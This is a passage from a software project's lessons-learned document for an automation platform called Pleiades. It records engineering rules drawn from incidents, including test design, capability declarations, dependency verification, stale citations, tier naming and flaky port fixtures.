**The rule.** When a safeguard is removed, delayed, refused or simply turns out not to exist, stop
and re-derive whether the action is still acceptable. And when asking for approval on something
risky, enumerate the operations rather than the phase: an approved plan with an unexamined step
inside it is an unexamined step.

## 144. Do not replace a correct hypothesis with a confident wrong one; say the evidence is unexplained

Diagnosing why a Windows host went unreachable, the first hypothesis was a firewall profile flip,
and it was later shown to be a real and correct description of one of the mechanisms in play. It
was then abandoned, because ARP was failing and an IP-layer firewall cannot stop ARP, and replaced
with the flat assertion "nothing is at that address, this is not filtering". That second claim was
delivered with more confidence than the ARP evidence could carry, and it was wrong about the cause.

The honest move at the abandonment point was available and cheap: "ARP is failing, which a firewall
does not explain, and I cannot account for that from here." That states the anomaly without
manufacturing a replacement theory to fill the hole. Instead a correct-but-incomplete explanation
was swapped for an incorrect-but-complete one, because a complete story felt like progress.

The actual answer came from a console `ipconfig` a human ran, showing `DHCP Enabled: No` with an
APIPA address: netsh had disabled DHCP and then failed to bind the static address. Neither
hypothesis had predicted it, and the first one was closer.

**The rule.** An unexplained observation is a fact to report, not a gap to fill. When evidence
contradicts a working theory, the options are "the theory is incomplete", "the evidence means
something I do not understand", and "here is a better theory", and the third one requires actually
having a better theory, not just an unsatisfied need for one. Grade confidence to evidence
separately for each claim, especially when replacing an earlier claim, because a correction
inherits unearned authority from the act of correcting.

## 145. A test that has to break the thing it observes is measuring the wrong path

**The rule.** When a test makes its subject fail in order to see the subject's output, treat that as
a defect report against the product, not as a testing technique. Fix the observability gap and
rewrite the test on the success path.

**Where this came from.** `pleiades run` printed `ok` or `changed` per task and nothing else, while
the failure path printed the error, and a Collection method's error carries its stdout. So the only
way to read a device's answer back from the CLI was to make the task exit non-zero. Three places in
one release gate did exactly that, each with a task literally named "and fail so its output is
printed," and the workaround was documented in a comment as a known CLI gap rather than treated as
one to close.

The cost was not the ugliness. It was that every one of those assertions ran against the error path
while claiming to be about the success path. A regression that broke reporting for successful tasks
would have left all three green. The gate that proved "WinRM reaches a Windows host" proved it
about a failing run only.

The fix was `run --verbose`, which is fifteen lines in the CLI and one field on `NodeResult`, and it
was available the entire time. What kept it from being written is that the workaround worked: each
individual test passed, so nothing forced the question, and the comment explaining the trick made it
look considered rather than deferred.

**How to apply it.** When you write `exit 3` so you can see something, or assert on an error string
to read a value that is not an error, stop and ask what the product should have printed. If the
answer is "this, on success," that is the change. The tell is a test name or comment containing the
word "so": "fail so its output is printed," "error so we can read the body." That word marks a
workaround wearing a technique's clothes.

The counter-case is real and worth naming: a test that deliberately fails something to prove the
FAILURE path is correct is not this. The difference is whether the failure is the subject or the
instrument.

## 146. A generic method's capability floor is not automatically safe to declare in a device type's baseline just because a sibling generic method's was

**Where this came from.** `svc.start`/`svc.stop`/etc. resolve `capability.ServiceManagerCapable`
and dispatch to a concrete method (`svc.systemd.start`), and `linux.Server` declares the concrete
`SystemdCapable` unconditionally in its baseline, because systemd is the mainstream case and
declaring only the broad parent would leave the concrete methods unreachable on every stock
`linux_server`. Writing `pkg.install`/`pkg.apt.install` the same session, the same shape looked
obviously reusable: resolve `PackageManagerCapable`, dispatch to `pkg.apt.install`, declare
`AptCapable` in `linux.Server`'s baseline the same way `SystemdCapable` is declared. It is not the
same shape. `internal/inventory/devices/linux/server_test.go`'s
`TestNewServer_UnionsClassificationCapabilities` already exists specifically to forbid this:
`linux.Server` does not structurally implement `AptCapable`, on purpose, and the test's own comment
says why ("neither side is trusted alone").

**Why the two cases differ even though they look identical.** Service manager and package manager
are both "which specific implementation of a near-universal Linux subsystem does this box run,"
and both have a generic-plus-concrete dispatcher of the same shape. The difference is whether a
single default is honestly true of most instances of the device type. Systemd genuinely is the
default for the overwhelming majority of modern Linux servers; a non-systemd host is the rare
exception, and the `service_manager` property exists precisely to let that exception say so.
Package manager has no equivalent honest default: a generic `linux_server` record is Debian-family
or Red Hat-family in roughly the same proportion across a real fleet, and declaring `AptCapable`
unconditionally would be actively wrong on every RHEL/CentOS/Fedora/Rocky/Alma box, far more often
wrong than defaulting a service manager to systemd ever is.

**What this means in practice, and what it does not.** `pkg.apt.*`/`pkg.dnf.*` were implemented and
tested at full quality (real converge logic, real inverses, real mutation-proofed tests against a
fake `apt-get`/`dnf` on `PATH` over a real SSH server) without touching `linux.Server`'s capability
set at all, leaving the namespace genuinely implemented but not yet reachable against any real
inventory device. That is not a shortcut or an unfinished half of the work; wiring a device to a
capability that is genuinely per-instance data is a separate, deliberate decision (a new
distro-family-specific device type, or a classification-driven accessor with no safe unconditional
default) that deserves its own session rather than being smuggled in as a side effect of "make the
new namespace match the pattern the last one used."

**How to apply it.** Before declaring a capability in a device type's baseline because a sibling
generic method's dispatcher already does something that looks the same, ask whether the concrete
value (which service manager, which package family, which init system) has an honest majority
default across real instances of that device type, the way `service_manager` defaulting to
`systemd` does. If every real instance is roughly as likely to need one branch as another, a
baseline declaration is a coin flip dressed as a fact, and the regression test protecting against
exactly that (`TestNewServer_UnionsClassificationCapabilities` here) is doing its job correctly by
staying red. `identity.*` will face this same question (`useradd`/`groupadd` are POSIX-universal in
a way package managers are not, so it may resolve differently) and should be decided freshly rather
than by analogy to either `svc.*` or `pkg.*` alone.

**Update, `identity.*` session:** the question did resolve freshly, and landed on the same outcome
as `pkg.*` for a different reason. `useradd`/`groupadd` being POSIX-universal turned out not to be
the relevant fact: the gap `capability.AptCapable` has is that no device type implements its
accessor method (`AptSourcesList`) at all, not that the accessor's *answer* varies by instance.
`capability.PosixAccountCapable`'s own accessor, `PasswdPath() string`, has exactly the same
problem — nothing in this repository implements it either, regardless of how universal POSIX
accounts are. A capability interface needs a real accessor on a real device type before
`HasCapability` can ever return true for it, independent of whether the underlying concept has an
honest default; `identity.user.*`/`identity.group.*` shipped at the same tier `pkg.apt.*` did,
implemented and tested against a real SSH server with fake `getent`/`useradd`/`groupadd` on `PATH`,
genuinely unreachable against a real inventory device until some device type adds that accessor.

## 147. Build a converge method's inverse from the value you are about to overwrite, not from a before/after requery

**The rule.** When a method converges an existing resource's attributes (as opposed to creating or
removing it outright) and needs to record a real, restorable inverse, capture each attribute's old
value at the moment the method decides to change it — from the same query that drove the decision
— rather than by diffing a "before" snapshot against an "after" snapshot taken by re-querying the
resource once the mutating command has run.

**Why.** `identity.user.create`'s and `identity.user.modify`'s first implementation built their
inverse this second way: converge whichever attributes differed from what `getent passwd` reported,
run `usermod`, re-query the account, and diff the fresh "after" against the original "before" to
find which fields to restore. Every test written against a synthetic fake `getent` (the same
technique `pkg.apt.*`'s own tests use — a shell script controlled by fixed environment variables)
failed with the inverse missing the very attribute the test had just changed, because the fake
script's output does not depend on what `usermod` was told to do: it is a canned response, not a
stateful simulation of the account database. The requery after a converge, in the test harness,
reports exactly what it reported before. The deeper problem this exposed is not really about test
fakes: relying on a post-mutation query to correctly reflect a mutation this platform itself just
issued is an assumption about NSS-backed system state (LDAP, SSSD, cached `getent` responses) that
does not need to be made at all, because the value being overwritten was already in hand from the
query that decided to overwrite it.

**How to apply it.** In a `desired`-vs-`current` converge function (see
`internal/catalog/identity/user/user.go`'s `converge`), return the old value of each attribute
alongside the mutation's own command-line flags, at the same point the decision to touch that
attribute is made, and build the inverse's `Params` directly from that returned map. Keep the
post-mutation requery only for what it is legitimately for: the operator-facing `sdk.Diff` before/
after record, which is allowed to be aspirational about a real device's state in a way an inverse
that a future rollback will actually execute cannot afford to be. `pkg.apt.*`/`pkg.dnf.*` never hit
this because neither of their inverses depends on a converge's after-state: `install`'s inverse is
a plain removal, `remove`'s inverse pins the version captured before deleting, and `upgrade` records
no inverse at all. The first method in the catalog whose inverse depends on *which* attributes an
existing resource's converge changed is where this pattern had to be worked out.

## 148. When a method's own tests must exercise a real command executor, a well-known system path it touches has to be a task parameter, not a hardcoded constant

**The rule.** If a Collection method reads or writes a specific system path (`/etc/fstab`,
`/etc/hosts`, a registry hive, a well-known config file) and its tests run that method against a
*real* command executor rather than a mock (this codebase's own RULE 0), that path must be exposed
as a parameter with the well-known location as its default, never hardcoded. The parameter is not
convenience API surface; it is what makes the method testable at all without either touching the
real host's file during a test run or falling back to a mock that would fail RULE 0.

**Why.** `pkg/remoteexec/remoteexectest.Start` runs every command a test sends through a real
`exec.Command("/bin/sh", "-c", command)` on the actual machine running the test — there is no
sandboxed filesystem underneath it, no chroot, no fake `/etc`. `fs.mount`/`fs.unmount` need to read
and rewrite an fstab file (via `pkg/remotefile`'s real `Read`/`Write`/`Stat`/`Apply`, the same
primitive `internal/catalog/file/line` already established for "read the whole file, decide in Go,
write the whole file back" rather than trusting `sed`). Had the fstab path been hardcoded to
`/etc/fstab` the way a first draft assumed, every test exercising the persistence half of these
methods would have had to either genuinely rewrite the test-runner's own `/etc/fstab` — unacceptable
in any environment, let alone a sandboxed one — or abandon RULE 0 and mock `remotefile` out from
under the method, which is exactly the failure mode RULE 0 exists to catch (a test that mocks the
layer being tested proves nothing about it). Making `fstab` a parameter, defaulting to `/etc/fstab`,
let every test point it at a `t.TempDir()` path instead, so the tests run the method's real read-
modify-write logic against a real file without touching anything outside the test's own sandbox.

**The tell that this is available, not invented.** Ansible's own `ansible.builtin.mount` module
already exposes an `fstab:` parameter for the identical reason (its own test suite needs to point
at a fixture file, not the control node's real one). This platform's own vocabulary-reuse
philosophy — a runbook migrating from Ansible should rename nothing it does not have to — means the
same parameter existing for the same underlying reason is confirmation the design is right, not a
coincidence to double check. When a method's own test-safety need and an existing Ansible module's
parameter surface point at the same missing parameter, that is the parameter to add.

**How to apply it.** Before hardcoding any path a method's real command executor will touch —
especially one central enough that a real environment guarantees its existence (`/etc/fstab`,
`/etc/hosts`, `/etc/resolv.conf`) — check whether the Ansible module this method mirrors already
parameterizes it, and if this method's own tests will need to run real commands against it (per
RULE 0), add the parameter regardless of whether Ansible does. A method that never needs a real
command executor in its own tests (an HTTP-API-backed method, for instance) does not have this
pressure and can reasonably default to a hardcoded well-known value with no parameter at all; the
pressure is specific to "this runs a real shell command against this path in its own tests."

---

## 149. Verify a live dependency's current terms and behavior by actually running it, not from what a prior session established

**The incident.** The `cloud.aws.*` batch's plan named LocalStack as the real-target verification
strategy for methods that address the AWS HTTP API directly (no fake shell script can stand in for
a wire protocol), and named "no live account, no cost, no CI secret dependency" as the reason it
was chosen over real AWS. That premise was true when the plan was written and false by the time the
first container actually started: `localstack/localstack`'s published image now exits immediately
with "License activation failed" unless `LOCALSTACK_AUTH_TOKEN` is set, a real relicensing that
happened at some point in this project's own lifetime, not a misconfiguration or a bad image tag.
The plan's own stated rationale was gone the moment the container was actually run. The fix was not
to argue from the plan's original reasoning (which was sound when written) but to run the real
container, read its real refusal, and revise the plan with the user rather than silently
substituting a fake.

The same discipline paid off repeatedly afterward, on smaller questions the same session kept
running into: whether a fabricated instance ID would produce a real `InvalidInstanceID.NotFound`
API error or a quiet empty success (both actually happen, depending on whether the ID merely looks
well-formed); whether `RunInstances` would reject an invalid `instance_type` the way real AWS does
(it does not, against LocalStack); whether requesting a specific `PrivateIpAddress` would suppress
the automatic `PublicIpAddress` assignment (it does not — both are set, confirmed by one throwaway
`main.go` hitting the real container and printing the result). Every one of these was a case where
the *plausible* assumption (derived from how real AWS is documented to behave, or from how the
previous SSH-based batches' fake shell scripts behaved) was either right or wrong in a way that
could only be told apart by asking the real target directly, in under a minute, with a disposable
Go program deleted immediately after. Guessing wrong and writing a test around the guess would have
produced a test that passively verified a fiction — passing today, telling nothing about tomorrow —
which is exactly the failure RULE 0 exists to rule out, applied one level up: not just "does this
test touch a real system," but "is what I believe about that real system's current behavior itself
verified, or inherited."

**How to apply it.** When a plan's chosen verification strategy depends on a live dependency's
current behavior, terms, or state — an image's licensing, an API's validation strictness, a
service's default configuration — verify it by running the real thing before committing code or
tests to the assumption, even (especially) when the assumption was true in an earlier session or
reads as obviously true from documentation. A disposable diagnostic program (or command) against
the real target, run once and deleted, is cheap; a test suite built on a stale or merely-plausible
belief about that target is not. When the real behavior contradicts the plan, stop and revise with
whoever approved the plan rather than quietly substituting a workaround — the same "re-derive
before carrying across a stale judgement" instinct LESSONS_LEARNED #143 already names for a removed
safeguard, applied here to a changed dependency instead.

## 150. A generic dispatcher's "declared but not implemented" branch loses its only real test case the moment every namespace it can resolve to becomes implemented

**The incident.** `internal/catalog/svc/svc_test.go`'s `TestDeclaredButNotImplementedTargetIsNamed`
proved `dispatch`'s refusal for a registered-but-unimplemented concrete target by pointing a
`windows_scm` device at `svc.windows.start`, which was true and declared-not-implemented at the
time that test was written. This session implemented all five `svc.windows.*` methods, and the
test kept compiling and kept passing its own assertions' *shape* right up until the moment `go
test` actually ran it: `svc.windows.start` was now `StatusImplemented`, so `dispatch` sailed past
the branch under test entirely and invoked the real `windows.Start`, which failed for a completely
different reason (the test harness's fake device implements `SSHHost`/`SSHPort`, not
`WinRMHost`/`WinRMPort`) that happened to still produce a non-nil error — meaning a naively
observed "err != nil, test still red for basically the right shape" run could have read as passing
if the assertion checked less precisely. `internal/catalog/svc.managerNamespace` maps exactly two
service-manager names to exactly two namespaces (`systemd`, `windows_scm`), and once both are fully
implemented there is no longer any real device/verb combination reachable from outside the package
that exercises the "found in the registry, but `Status != StatusImplemented`" branch — every legal
input now either resolves to a real implementation or refuses earlier (unknown manager, missing
capability). The branch is still live, load-bearing code (it is what makes a partially-implemented
service-manager namespace fail cleanly rather than nil-pointer-panic), but the public API can no
longer reach it.

**How to apply it.** Before extending a batch that flips the last `StatusDeclared` entry a generic
dispatcher can resolve to, check whether any of that dispatcher's own tests depend on a *specific
concrete FQCN* remaining declared rather than on the *mechanism* of refusing a declared target in
the abstract — grep the dispatcher's test file for the FQCN literal, not just for the word
"declared". When the last real example is about to disappear, do not delete the test or leave it
silently asserting a now-false premise: add a whitebox (same-package) test file that registers one
throwaway, uniquely-named `StatusDeclared` descriptor purely as a fixture (a `pleiades forge`-style
name that cannot collide with anything real, e.g. `svc.systemd.dispatchtestonly`) and calls the
unexported dispatch function directly with a verb that resolves to it. This proves the branch
itself, honestly, using a fixture that is clearly a fixture, rather than either deleting real test
coverage or letting a test's premise quietly go stale while its assertions happen to still compile.
Replace what the retired test *was* actually reachable to prove — here, that dispatch really does
resolve and invoke the correct concrete method for a device — with a black-box test pointed at an
address nothing answers, asserting on the failure having reached the network with the right FQCN
named in it, the same "assert on the failure mode, not a live host" pattern
`pkg/winrmexec`'s own tests already use for the identical missing-real-backend constraint.


## 151. Generate the oracle from the implementation you must match, rather than hand-writing expectations for it

**Context.** Phase 23 hand-rolled an RFC 5545 recurrence engine rather than
taking a dependency, following this repository's established preference. The
release gate is bug-for-bug agreement with AWX across a daylight saving
boundary. The obvious risk with hand-rolling is not an outright bug -- those
show up -- but silent divergence on a case nobody thought to write down.

**What happened.** Rather than hand-writing expected occurrence lists, a small
Python script expanded 36 representative rules with `dateutil.rrule` (the
library AWX itself schedules on) into a committed JSON golden file, and the Go
tests assert exact instant equality against it. 34 of the 36 passed on the
first run. The two failures were both real defects that no hand-written test in
this codebase would have produced, because both required knowing what dateutil
does rather than what RFC 5545 says:

1. Sub-daily frequencies took their time of day from DTSTART instead of from
   the period being walked, so `FREQ=HOURLY` expanded every period to the same
   instant. A schedule that fires once and then never again, silently.
2. The expansion ran in the target time zone, so Go's `time.Date` normalisation
   of a spring-forward gap fed back into the iteration state and an hourly rule
   crossing the gap collapsed onto one repeated instant. The fix was
   structural: walk in civil (wall-clock) time and localise only at emission.

A third finding was not a bug but would have been mistaken for one: for a
wall-clock reading that does not exist, Go's `time.Date` picks the
post-transition offset while PEP 495's `fold=0` -- which dateutil follows --
keeps the wall clock and applies the PRE-transition offset. The two produce
different instants. Nothing in the standard library documentation says this;
it was established by running both.

**The rule.** When the acceptance criterion is "matches implementation X",
generate the test oracle from X. Commit the generated artifact so the foreign
toolchain is never a build or CI dependency, and say so where somebody might
otherwise wire it in. Hand-written expectations encode what the author believed
the target does, which is exactly the belief under test.

**The corollary.** This only works if the generated fixtures cover the places
the two implementations can plausibly disagree, not the happy path. The cases
that earned their place here were daylight saving transitions in both
hemispheres, a half-hour-offset zone with no DST at all, leap days, month-end
rules over short months, ordinal weekdays, BYSETPOS, WKST changing which weeks
an interval selects, and exclusion rules straddling a transition.

## 152. A `file:line` citation is unverifiable by any tool in this repo, so it rots silently -- and copying one forward into a new document multiplies the rot instead of inheriting a fact

**The incident (2026-08-22).** Writing new phase specs required citing
`TestPkgNeverImportsInternal`. The spec tree said
`internal/archtest/layering_test.go:129` in three places, `:129-137` in a
fourth, and `:129-174` in a fifth. The test was at `:199`. Every one of the
five was wrong, and none had ever failed anything: `make ci` runs
`docs-lint`, which checks that gitignored documents are not *cited from
user-facing pages*, and checks nothing at all about whether a line number
still points where it claims.

**Why it became five.** The first citation was correct when written. Each
later phase, following this document's own good practice of grounding claims
in the real source, copied the reference from the phase before it rather than
re-deriving it. Copying looks like inheriting a verified fact and is actually
duplicating an unverified one -- so a single unnoticed edit to
`layering_test.go` invalidated five documents at once, and the redundancy
that normally provides confidence instead provided false corroboration: a
reader who spot-checked one citation against another would find them
agreeing.

**The rule.** Cite the SYMBOL, which is stable and greppable
(`TestPkgNeverImportsInternal` in `internal/archtest/layering_test.go`), and
treat a line number as a perishable convenience, never as the identifier. When
a line number genuinely helps, re-derive it at writing time from the real file
rather than copying it out of a neighbouring document, and never carry a
`file:line` across a document boundary without re-checking it. The same applies
to a measured COUNT: Phase 74's "27 registered capabilities" was true when
written and false the moment Phase 73 landed four more.

**The corollary that keeps this cheap.** Do not retcon a measurement that was
correct when taken. Add a dated correction beside it, as Phase 74's entry now
carries, and record the counting method next to the count so the next reader
can re-measure in one command instead of trusting a number. A method survives
drift; a number does not.

## 153. Domain vocabulary that inverts a well-known idiom stays invisible to every automated gate, because internal consistency is all any of them can measure

**The incident.** From the beginning of the project until 2026-08-22, the three onboarding
tiers of PLAN.md Section 7 were named **Walk** (a CLI with no infrastructure at all,
`cmd/pleiades`), **Crawl** (Controller plus Runner, a state store, a broker and a web UI),
and **Run**. That inverts the first two rungs of "crawl, walk, run," the idiom the ladder is
obviously borrowing from: the cheapest rung carried the name of the more advanced one, so the
tier a reader expects to be the *first* step was in fact the *second*.

Nothing about the underlying design was wrong. Section 7's axis is ascending setup cost against
capability unlocked, Binding Rule 1 makes each tier a strict subset of the one above it, and
every table in the tree listed its rows in the correct ascending order. Only the two labels were
swapped, and they were swapped *consistently*, in all 262 occurrences across tracked files and
54 across the specification — user-facing docs (`docs/01-start-here.md`'s own section heading,
`README.md`, `docs/02-get-started.md`, `docs/03-migrating-from-ansible.md`), the `pleiades`
CLI's own `--help` tagline, Go doc comments, generated reference pages, and the archives.

**Nothing caught it, and nothing could have.** `make ci` was green throughout. There is no test
to write: every gate this repository runs measures internal consistency, and the naming was
perfectly internally consistent — a lint that knew "Walk means the cheap tier" would have to be
told the very fact that was wrong. `docs-lint` checks for leaked internal citations, not
semantics. The only detector for this class of defect is a reader's expectation, and the
authors had long since adapted to their own vocabulary.

**What surfaced it.** A completion-percentage question. A per-tier breakdown reported "Walk
100% (60 items), Crawl 83% (330 items)", and the project owner read it twice as a contradiction
— first "shouldn't crawl have less to do than walk?", then "isn't crawl a prerequisite to
walk?" Both readings were correct about the idiom and wrong about this codebase, which is
exactly the signature. The confusion arrived from the person who chose the names, on his own
project, roughly three weeks in. Anyone reading it cold would have hit it sooner and said
nothing.

**The correction, and what it did not touch.** The labels were swapped on 2026-08-22 across 113
files: the offline CLI tier is now **Crawl**, the Controller/Runner tier is now **Walk**, Run is
unchanged. Structure, row order, phase boundaries and every semantic claim stayed exactly as
they were; only the two words moved. Historical documents were rewritten along with everything
else, deliberately — `HANDOFF_ARCHIVE.md`, `FAILURE_PATTERNS_ARCHIVE.md`, this file and
`CHANGELOG.md` all now use the corrected vocabulary. **The consequence worth knowing: an
archive entry written before 2026-08-22 uses names that did not exist on the day it was
written.** Read "Crawl tier" in a 2026-08-05 handoff entry as the offline CLI, which that
session called Walk. Git commit messages were *not* rewritten and still carry the old, inverted
labels, so a commit dated before 2026-08-22 saying "Walk tier" means what the tree now calls
Crawl. The lettered phase identifiers `W1`–`W6` in `IMPLEMENTATION.md` also kept their `W`,
because renaming them to `C1`–`C6` would invalidate every cross-reference in the roadmap and
the archives for no semantic gain; the `W` there is now a historical artifact, not a mnemonic.

**The rule.** When domain vocabulary borrows an ordered idiom that readers already know —
crawl/walk/run, alpha/beta/GA, bronze/silver/gold, S/M/L — the idiom's canonical order is part
of the contract, not decoration. Check it at the moment of naming, out loud, against the phrase
as people actually say it. It is the cheapest possible check and there is no later one: no
compiler, no test, no linter and no CI job can see the mismatch, and every day it survives it
gets written into more files, more generated output, and more shipped documentation.

**The corollary, for the rename itself.** A vocabulary swap is not a `sed` job. Two failures hit
in a single pass here, both silent: a Perl `s///` replacement containing `@@@SENTINEL@@@`
interpolated `@SENTINEL` as an empty array and destroyed the very guards that were protecting
non-tier uses of the word (`filepath.Walk` became `filepathCrawl`); and `\bWalk\b` failed to
match inside the Go string literal `"\nWalk tier: ..."`, because the `n` of the escape sequence
is a word character, leaving the CLI's own tagline contradicting the two sibling strings in
`internal/clispec` and `internal/inventory` that had flipped correctly. Both were caught only by
verifying afterwards — by grepping the protected sites back out by name, and by diffing three
strings that should agree against each other. Swap under sentinels that cannot interpolate,
regenerate rather than hand-edit anything under `docs/reference/` or `internal/api/wellknown/`,
and verify the before and after occurrence counts are exact mirrors of one another rather than
merely both plausible.

## 154. A dependency a component cannot build for itself belongs in its constructor's signature, never in an option, because an option is what every caller except the one who wrote it forgets

**The incident.** The `aws` inventory sync plugin took its two dependencies, a credential
store and an AWS region, as functional options: `aws.WithCredentialStore` and
`aws.WithRegion`. The plugin registry's constructor was `func() Plugin`, taking no
arguments, so the instance `cmd/pleiades` built had neither. Every
`pleiades inventory sync --plugin aws` failed with "no region configured, use WithRegion,"
for the plugin's entire existence, while three separate test suites stayed green.

`gopls references` on both options returns test files and nothing else. That is the whole
finding in one line, and it was available at any point.

**Why the options looked right when they were written.** They are idiomatic Go, they read
well, and each carries a careful doc comment arguing correctly for its own existence:
`WithRegion`'s explains at length why a region must not become a field on the shared
`syncplugin.Config` (a shared type that grows a field per implementation stops being
shared), and it is right about that. The argument answers "where should this value not
live" and never answers "how does it get here in production."

**The composition root had already predicted this and been ignored.**
`cmd/pleiades/inventory.go`'s `buildSyncPlugin` wired exactly one plugin through a
`desc.Name == catalystcenter.Name` type switch, and its own doc comment said: "When a third
plugin needs it, this becomes an optional interface the plugin asserts rather than a longer
switch." The third plugin arrived. Nobody extended the switch, and nothing could tell,
because a plugin nobody wired still compiles, still registers, still appears in
`pleiades inventory plugins`, and still passes every test that constructs it directly.

**Why an optional interface would have been the wrong successor anyway.** The comment's own
proposal has the same defect one level up: an optional interface is something a plugin
author forgets to implement, and forgetting is silent in exactly the same way. The fix that
holds is the one that cannot be skipped: `Constructor` became `func(Deps) Plugin`, so every
constructor is handed the dependency whether it reads it or not, and a per-deployment value
an operator types became declared data on the descriptor (`Settings []SettingSpec`) that
`syncplugin.Open` refuses to proceed without, by name, with the setting's own description.

**The two guards that matter are different sizes.** The narrow one opens every registered
plugin through the shared path and checks that `RequiresCredentials` actually changes the
outcome. The broad one is structural and would have caught the original defect outright:
`internal/archtest.TestCompositionRootsBuildPluginsThroughTheRegistry` fails if any `cmd/`
package imports an individual plugin package. That forbids the type switch, which is what
made a per-plugin arrangement expressible at all. A rule that removes the *ability* to wire
one component differently from its siblings is worth more than a test that checks each
component was wired the same way.

**The rule.** When a component needs something it cannot construct for itself, put it in the
constructor's signature. Reserve options for genuine variation between call sites (a
timeout, a retry budget, an endpoint override) where every value is legitimate and the zero
value works. If a "with" function's absence makes the component refuse to run, it was never
an option; it was a parameter wearing an option's clothes, and the only caller who will ever
pass it is the test that was written beside it.

## 155. A guard written against one registry protects that registry only, and the surface it does not cover is exactly where the same defect ships next

**The incident.** Phase 73's Workstream A found three `StatusImplemented` Collection methods
requiring `DockerCapable` that no device type could satisfy, fixed it with a real device
type, and added
`internal/archtest.TestImplementedCollectionCapabilitiesAreSatisfiable` so the class could
not recur. In the same commit, that phase shipped four new capabilities, three transports,
three `TransportBinding` entries, three `engine.ActionCapability` rows and a documented
user-facing feature, with **no device type able to satisfy any of them**. Every
`serial_exec`, `serialtcp_exec` and `telnet_exec` task was refused for every device the
platform can build, twice over: once by `validate.CapabilityRule`, once by the binding's own
type assertion.

The guard did not fail, and could not. It iterates `catalogdata.Collections`. A transport
fqcn is not a Collection method and appears nowhere in that table.

**The tests that existed proved the wrong half.** `TestSerialTarget` and its two siblings
build their device as a stub wrapping `inventorytest.Stub`, which deliberately matches a
capability by name and skips the structural assertion a real device type performs. So they
proved `SerialTarget` reads the accessors it is handed. Whether anything the platform can
hydrate has those accessors is a different question, and no test asked it. That is the
identical shape Workstream A had just written up for `docker_test.go`, in a package whose
tests were written days later.

**What the third sweep found that neither of the first two could.** Both existing sweeps
start from a consumer (a method, a binding) and ask whether a device can satisfy it. A
capability with **no consumer at all** is invisible to both, yet it is published in
`docs/reference/capabilities.md` as part of the vocabulary an operator classifies devices
against. `FileTransferCapable` was exactly that, and
`docs/03-migrating-from-ansible.md` was telling migrating users that `archive.extract`
requires it, when that method requires `POSIXFileSystemCapable`. A reader following the
migration guide would have classified a device correctly per the docs and been quietly
wrong.

**The rule.** When a guard is written for a registry, enumerate every *other* registry that
can produce the same class of defect before calling the class closed, and write the sweep
that covers the union rather than the one in front of you. Ask the question from both ends:
can every consumer be satisfied, and is every declared name reachable by some consumer. And
negative-control each sweep with a permanent synthetic case in the test file, not a one-off
manual un-wiring: a control that runs once and leaves no trace cannot tell a later reader
whether the rule still matches anything.

## 156. A doc comment claiming exclusive ownership of a pattern is a repository-wide assertion no reader can check and no compiler enforces, so it must ship with its AST rule or be written weaker

**The incident.** `internal/topology`'s package doc calls it "the single owner of every NATS
JetStream subject, stream, consumer, and retention/replica setting used by Pleiades," and
`internal/archtest/layering_test.go`'s own comment repeats it more specifically: topology "is
the one place jetstream.StreamConfig/ConsumerConfig/KeyValueConfig shapes are declared, so
every other adapter can depend on topology instead of the driver directly." Both were false
when written. `lock.NewNatsLockManager` built its own `jetstream.KeyValueConfig` literal for
the `Pleiades_Locks` bucket, the one carrying every leader-election lease and every
per-device execution lease, and both `cmd/controller` and `cmd/runner` provision it on
startup.

Separately and in the same spirit, `catalystcenter.WithClientOption` and
`pkg/catalystcenter.WithHTTPClient` both carried doc comments saying "tests use it to point
at a stub server," and neither had a single caller anywhere in the module. The tests reach
their `httptest.Server` through `Config.Endpoint`, the same path production takes.

**Why both survive review.** A reviewer reading `topology.go` sees a plausible sentence about
a package they are looking at and no way to check it short of grepping the whole tree for a
struct literal. A reviewer reading `WithHTTPClient` sees a comment naming a caller and has no
reason to doubt it; the one check that would settle it (`gopls references`) is precisely the
check the comment discourages, because it appears to have already been answered.

**The asymmetry that makes the second kind worse.** A stale comment that says nothing is
inert. A stale comment that names a caller, a mechanism, or an exclusive owner actively
redirects the reader away from verifying it. It converts an open question into a settled one
in the reader's head, which is the opposite of what a comment is for.

**The rule.** An assertion about the whole repository ("this is the only place X happens",
"nothing else does Y") belongs in an enforced rule, written in the same commit as the
sentence. `internal/archtest` is where this project puts them, and the AST walk that finds a
`jetstream.*Config` composite literal outside one package is about forty lines. If the rule
is not worth writing, write the weaker sentence that is true without it. The same applies at
the smaller scale: a doc comment naming a caller is a claim with an expiry date, so either
name the mechanism instead (which cannot rot the same way) or state plainly that there is no
caller today and why the shape is kept.

## 157. Sweep for a recurring construction by what the code is trying to say, not by the shape of the instance in front of you, and do it before the fix rather than after the next failure

**The incident.** A "this address must refuse connections" test fixture, built by opening a
listener, reading its assigned port, closing it, and dialing the number again, has now failed
in this repository three separate times: `FAILURE_PATTERNS.md` #123, then #177, then #183. A
just-released loopback port keeps accepting connects on this project's WSL2 development host,
so the dial sometimes succeeds and the failure the test exists to observe never happens.

#177's fix touched the one file where the failure was observed. Nine more sites carried the
identical construction, written in the same phase, and one of them flaked in the next
session's very first full sweep.

**The second miss is the lesson, not the first.** After that flake, a grep did go looking for
the rest. It matched on the expression shape, `Addr().(*net.TCPAddr).Port` near a `Close`, and
found four sites, which were fixed and repeat-run clean. A later full sweep then failed on a
fifth, in a package the grep had walked past, and re-searching turned up five in total that
the first pass had missed: one spelled `Addr().String()`, one used
`LocalAddr().(*net.UDPAddr).Port`, one was a second occurrence inside a file that had just
been edited for the first, and two were in a sibling package whose tests read almost
identically to ones already fixed.

Searching instead for what the code was *trying to say* found every one of them in a single
pass: the phrase "nothing is listening", the variable name `deadListener`, the trailing
comment "nothing is listening now". Those are the things an author writes when reaching for
this construction, and they vary far less than the expression does.

**Two of the ten sites correctly refused the standard fix, and that matters too.** A sweep
that mechanically applies one fix everywhere produces tests that pass for new wrong reasons.
The TFTP test asserts a *timeout budget* bounds the call, so a closed UDP port (which answers
with an ICMP port-unreachable) or an invalid address (which fails validation earlier still)
would both end the call before the budget ever bound anything; it needed a real socket held
open and silent instead. `wait.port`'s helper needs a concrete port that is closed now and
bindable later, which port 0 cannot express at all, so it closes the race by *checking* instead
of by construction: it confirms the released port really refuses a connection before handing it
back, and retries if not.

That second one was first left alone under a comment calling it a considered exception, and the
very next full sweep failed on it. Which is its own correction to this lesson: "the standard fix
does not apply here" is a reason to find the fix that does apply, not a reason to stop. A
documented exception is still a flaky test, and the documentation does not make the gate green.

**The rule.** Finding a recurrence once is evidence the construction is attractive, not
evidence it appeared once. Sweep the whole tree in the same commit as the fix, search on the
intent rather than the syntax (comments, variable names, the sentence in the failure message),
and when a site cannot take the standard fix, write down why it is different rather than
forcing it or silently skipping it. The grep costs a minute; the alternative is discovering
each remaining instance separately through a nondeterministic failure, which is exactly what
